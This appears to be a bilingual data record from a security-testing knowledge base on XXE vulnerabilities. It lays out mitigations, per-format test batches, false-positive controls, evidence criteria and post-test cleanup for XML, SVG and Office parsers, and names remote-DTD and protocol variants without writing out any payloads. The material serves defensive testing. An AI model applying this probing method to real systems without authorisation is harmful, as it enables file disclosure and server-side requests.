mitigation.en: 1. Disable DTDs, external entities, external schemas, and XInclude at shared XML-factory layers. 2. Give every document and image converter no network, low privilege, and a minimal file view. 3. Deny resolver schemes, hosts, and paths by default. 4. Maintain per-entry regression matrices, component inventories, and configuration-drift checks rather than fixing only one format.

title.zh: 建立解析入口矩阵

description.zh: 枚举 API XML、SVG、Office 文档和转换任务，记录每个入口实际使用的解析器、版本和权限。
description.en: Inventory API XML, SVG, Office documents, and conversion jobs and record the parser, version, and privileges for each entry.

title.zh: 按格式分批运行样例

description.zh: 将现有综合 XXE 集合按基础 XML、SVG、Office 和远程 DTD 分组，逐批关联任务与输出。
description.en: Group the existing comprehensive XXE set into basic XML, SVG, Office, and remote-DTD batches and correlate each job and output.

title.zh: 为每个能力建立对照

description.zh: 对每个解析器分别比较无 DOCTYPE、无外部访问和不存在资源，避免跨格式推断或批量误报。
description.en: For each parser, compare no-DOCTYPE, no-external-access, and missing-resource controls to avoid cross-format inference and batch false positives.

title.zh: 统一工厂配置并全矩阵回归
title.en: Unify parser configuration and regress the full matrix

description.zh: 在共享解析工厂和各转换器关闭外部能力后重跑全部分组，确认没有遗漏的二次解析器。
description.en: Disable external capabilities in shared parser factories and converters, then rerun every group to confirm no secondary parser was missed.

review.rationale: 原集合跨通用 XML、SVG、SpreadsheetML、WordprocessingML 与 PHP expect，并混合普通实体和外部参数实体；未声明 w 前缀的 Word 行无法解析，需按格式/机制拆分并退役。
lineDisposition: line 7 -> retire: unbound w namespace prefix makes the XML document invalid

prerequisites.zh: 已按实际入口把基础 XML、SVG、Office XML、远程 DTD 和协议 scheme 分配给对应 parser/worker，不将整套集合一次性投递。
prerequisites.en: Basic XML, SVG, Office XML, remote DTD, and protocol schemes are mapped to their actual parser or worker entry and the full collection is never submitted at once.

prerequisites.zh: 每个格式使用独立合法 fixture、沙箱 marker 和唯一任务/回调 token，记录 parser 能力矩阵、文件/网络审计和派生输出。
prerequisites.en: Each format uses an independent valid fixture, sandbox marker, and unique job or callback token, recording a parser capability matrix, file or network audit, and derived output.

analysis.zh: 阳性证据必须逐分支成立：本地实体需 marker 文件读取，远程 DTD 需应用源 token 回调，SVG/Office 需对应 worker 展开，协议变体需 parser 明确支持。 假阳性边界：某格式语法被接受、路径或 ATTACKER 字符串回显、客户端 parser 成功、DNS 查询、解析错误或另一个入口的结果不能外推到全部格式/协议。
analysis.en: Positive evidence is branch-specific: local entities need a marker-file read, remote DTD needs an application-origin token callback, SVG or Office needs expansion by its worker, and protocol variants need explicit parser support. False-positive boundary: Syntax accepted in one format, reflected path or ATTACKER text, client-parser success, DNS queries, parse errors, or results from another entry cannot be generalized to every format or protocol.

opsecTips.zh: XXE 综合矩阵每轮只测试一个格式/机制并使用 marker；禁止真实文件、元数据、gopher 和公共目标，出现扩张、外连或 worker 压力时停止。
opsecTips.en: The XXE matrix tests one format and mechanism per run with a marker; real files, metadata, gopher, and public targets are forbidden, and testing stops on expansion, egress, or worker pressure.

opsecTips.zh: 逐格式删除 fixture、marker、DTD/token 和派生产物，关闭监听器，清理各 parser/任务缓存与日志，并更新能力矩阵。
opsecTips.en: Delete per-format fixtures, markers, DTDs, tokens, and derived artifacts, close listeners, clear each parser and job cache plus logs, and update the capability matrix.
